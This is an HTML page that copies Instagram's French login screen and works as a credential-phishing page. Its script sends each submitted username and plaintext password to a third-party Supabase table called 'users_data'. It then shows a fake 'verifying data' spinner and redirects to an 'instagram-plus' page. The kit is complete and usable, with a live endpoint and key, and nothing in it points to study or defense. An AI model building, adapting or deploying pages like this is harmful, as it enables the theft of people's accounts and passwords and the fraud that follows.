<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .lang-selector { font-size: 13px; color: #737373; margin-top: 10px; }
    .main-container {
      width: 100%;
      max-width: 320px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: auto 0;
    }
    .logo-img { width: 60px; height: 60px; margin-bottom: 25px; }
    form { width: 100%; display: flex; flex-direction: column; gap: 10px; }
    .input-field {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 12px;
      padding: 14px 12px;
      font-size: 14px;
      outline: none;
      color: #262626;
    }
    .input-field:focus { border-color: #a8a8a8; }
    .btn-login {
      width: 100%;
      background-color: #0064e0;
      border: none;
      border-radius: 20px;
      color: #ffffff;
      font-weight: 600;
      padding: 12px;
      font-size: 14px;
      cursor: pointer;
      margin-top: 5px;
    }
    .btn-login:disabled { opacity: 0.6; cursor: default; }
    .forgot-password {
      color: #000000;
      font-size: 13px;
      font-weight: 600;
      text-decoration: none;
      margin-top: 15px;
      text-align: center;
    }
    .footer-container {
      width: 100%;
      max-width: 320px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 10px;
      gap: 15px;
    }
    .btn-create {
      width: 100%;
      background: transparent;
      border: 1px solid #0064e0;
      border-radius: 20px;
      color: #0064e0;
      font-weight: 600;
      padding: 10px;
      font-size: 14px;
      text-decoration: none;
      text-align: center;
    }
    .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; }
    
    /* شاشة التحقق والانتظار 10 ثوانٍ */
    .loading-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255, 255, 255, 0.98);
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .spinner {
      width: 40px; height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0064e0;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .loading-text { font-size: 15px; color: #262626; font-weight: 500; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

  <div class="lang-selector">Français (France) ∨</div>

  <div class="main-container">
    <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">

    <form id="loginForm">
      <input type="text" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
      <button type="submit" id="submitBtn" class="btn-login">Se connecter</button>
    </form>

    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
  </div>

  <div class="footer-container">
    <a href="#" class="btn-create">Créer un nouveau compte</a>
    <div class="meta-logo">∞ Meta</div>
  </div>

  <!-- شاشة الانتظار -->
  <div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text">Vérification des données...</div>
  </div>

  <script>
    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const form = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      submitBtn.disabled = true;

      try {
        const { data, error } = await supabaseClient
          .from('users_data')
          .insert([{ email: email, password: password }])
          .select();

        if (error) {
          console.error('Database Error:', error);
          alert('Erreur: ' + error.message);
          submitBtn.disabled = false;
        } else if (data && data.length > 0) {
          localStorage.setItem('user_row_id', data[0].id);
          
          // عرض شاشة الانتظار
          loadingOverlay.style.display = 'flex';
          
          // التوجيه لصفحة instagram-plus بعد 10 ثوانٍ
          setTimeout(() => {
            window.location.href = './instagram-plus.html';
          }, 10000);
        }
      } catch (err) {
        console.error('Unexpected Error:', err);
        alert('Erreur inattendue!');
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
